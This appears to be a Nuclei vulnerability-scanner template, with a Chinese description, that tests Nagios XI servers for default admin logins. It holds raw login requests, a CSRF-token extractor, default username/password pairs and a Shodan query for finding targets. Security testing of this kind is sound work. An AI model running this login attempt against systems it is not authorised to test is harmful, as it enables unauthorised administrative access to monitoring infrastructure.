id: nagiosxi-default-login

info:
  name: Nagios XI 默认管理员登录检测（弱口令）
  author: ritikchaddha
  severity: critical
  description: |
    该模板用于检测 Nagios XI 检测 是否仍可使用默认凭据或弱口令登录。模板主要向 `/nagiosxi/login.php`、`/nagiosxi/index.php` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `Home Dashboard</a>`、`Admin</a>` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可进入 Nagios XI 检测 管理后台，修改任务、服务、插件、路由、作业调度或部署配置。
    - 在 DevOps、网关、监控或运维场景中，后台失陷可能影响生产任务执行、泄露密钥配置，并扩大到下游主机或业务系统。
  remediation: |
    - 立即修改默认管理员口令并清理示例账号，按角色最小化后台管理权限。
    - 将控制台和管理 API 放入受控网络或 VPN 后方，并开启多因素认证、登录失败限制和操作审计。
    - 复核近期任务、插件、连接配置、访问令牌和部署记录，轮换可能暴露的密钥。
  reference:
    - https://nagiosxi.demos.nagios.com/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
    cpe: cpe:2.3:a:nagios:nagios_xi:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 6
    shodan-query: title:"Nagios XI"
    product: nagios_xi
    vendor: nagios
  tags: nagios,nagiosxi,default-login,vuln

http:
  - raw:
      - |
        GET /nagiosxi/login.php HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /nagiosxi/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        nsp={{nsp}}&page=auth&debug=&pageopt=login&username={{username}}&password={{password}}&loginButton=
      - |
        GET /nagiosxi/index.php HTTP/1.1
        Host: {{Hostname}}

    payloads:
      username:
        - nagiosadmin
        - root
      password:
        - nagiosadmin
        - nagiosxi
    attack: pitchfork
    stop-at-first-match: true
    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        part: body_3
        words:
          - 'Home Dashboard</a>'
          - 'Admin</a>'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: nsp
        part: body
        group: 1
        regex:
          - 'name="nsp" value="(.*)">'
        internal: true
